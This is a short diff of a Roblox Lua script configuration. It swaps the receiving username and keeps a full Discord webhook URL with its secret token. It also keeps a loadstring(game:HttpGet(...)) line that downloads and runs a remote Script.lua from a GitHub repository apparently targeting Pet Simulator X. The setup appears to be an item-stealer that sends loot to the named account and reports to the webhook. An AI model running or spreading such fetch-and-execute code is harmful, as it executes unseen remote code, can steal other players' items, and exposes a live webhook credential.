@@ -1,4 +1,4 @@
-UserName = "jessythagoat12"
+UserName = "Louisiana_hotspot"
 WebHook = "https://discord.com/api/webhooks/1068585817305514084/hryoAxFh8TEp0NnFW7-rXh_DsgDNFGpSjNHFtmMLDpsQ_sfj8_wN-4RhKJE5IKbfIAlM"
 Mention = false
 loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
